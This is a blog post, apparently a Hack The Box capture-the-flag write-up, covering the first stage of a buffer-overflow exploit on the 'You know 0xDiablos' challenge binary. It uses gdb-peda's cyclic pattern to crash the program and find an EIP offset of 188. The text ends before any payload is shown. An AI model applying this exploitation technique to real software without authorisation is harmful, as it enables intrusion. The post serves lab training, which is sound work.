---
layout: post
title: 'Hack The Box | You know 0xDiablos'
date: '2023-02-09 10:48:44 +0100'
image:
  path: /assets/img/posts/you-know-0xdiablos/you-know-0xdiablos.png
  alt: You know 0xDiablos - card
tags: [HackTheBox, buffer-overflow]
---



## Tools used

  - gdb : with peda
  - pwntools
  - python3


## Discover the eip offset

To create buffer overflow you need to highlight it. In the `vuln` function in the vuln file we see this line :

```cpp
char local_bc [180];
```

It is a string of 180 bytes or 179 characters and the end character 0x00. We need to find the number of bytes 

Start the program and wait the first break point (`peda` set automatically on main):

```bash
gdb-peda$ start

[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[----------------------------------registers-----------------------------------]
EAX: 0x80492b1 (<main>: lea    ecx,[esp+0x4])
EBX: 0xf7e1cff4 --> 0x21cd8c 
ECX: 0xffffcf90 --> 0x1 
EDX: 0xffffcfb0 --> 0xf7e1cff4 --> 0x21cd8c 
ESI: 0x8049330 (<__libc_csu_init>:      push   ebp)
EDI: 0xf7ffcb80 --> 0x0 
EBP: 0xffffcf78 --> 0x0 
ESP: 0xffffcf70 --> 0xffffcf90 --> 0x1 
EIP: 0x80492c0 (<main+15>:      sub    esp,0x10)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80492bc <main+11>: mov    ebp,esp
   0x80492be <main+13>: push   ebx
   0x80492bf <main+14>: push   ecx
=> 0x80492c0 <main+15>: sub    esp,0x10
   0x80492c3 <main+18>: call   0x8049120 <__x86.get_pc_thunk.bx>
   0x80492c8 <main+23>: add    ebx,0x2d38
   0x80492ce <main+29>: mov    eax,DWORD PTR [ebx-0x4]
   0x80492d4 <main+35>: mov    eax,DWORD PTR [eax]
[------------------------------------stack-------------------------------------]
0000| 0xffffcf70 --> 0xffffcf90 --> 0x1 
0004| 0xffffcf74 --> 0xf7e1cff4 --> 0x21cd8c 
0008| 0xffffcf78 --> 0x0 
0012| 0xffffcf7c --> 0xf7c23295 (add    esp,0x10)
0016| 0xffffcf80 --> 0x0 
0020| 0xffffcf84 --> 0x70 ('p')
0024| 0xffffcf88 --> 0xf7ffcff4 --> 0x33f14 
0028| 0xffffcf8c --> 0xf7c23295 (add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Temporary breakpoint 1, 0x080492c0 in main ()
```

To get eip offset you need to 

```bash
gdb-peda$ pattern create 200 input.txt
Writing pattern of 200 chars to filename "input.txt"
```
```bash
gdb-peda$ r < input.txt
Starting program: /home/rether/Documents/HTB/tracks/You know 0xDiablos/vuln < input.txt
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
You know who are 0xDiablos: 
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xc9 
EBX: 0x76414158 ('XAAv')
ECX: 0xf7e1e9b8 --> 0x0 
EDX: 0x1 
ESI: 0x8049330 (<__libc_csu_init>:      push   ebp)
EDI: 0xf7ffcb80 --> 0x0 
EBP: 0x41594141 ('AAYA')
ESP: 0xffffcf40 ("ZAAxAAyA")
EIP: 0x41417741 ('AwAA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41417741
[------------------------------------stack-------------------------------------]
0000| 0xffffcf40 ("ZAAxAAyA")
0004| 0xffffcf44 ("AAyA")
0008| 0xffffcf48 --> 0xf7fc1b00 --> 0xf7c1f29f ("GLIBC_2.36")
0012| 0xffffcf4c --> 0x3e8 
0016| 0xffffcf50 --> 0xffffcf70 --> 0x1 
0020| 0xffffcf54 --> 0xf7e1cff4 --> 0x21cd8c 
0024| 0xffffcf58 --> 0x0 
0028| 0xffffcf5c --> 0xf7c23295 (add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41417741 in ?? ()
```



```bash
gdb-peda$ pattern_offset 0x41417741
1094809409 found at offset: 188
```

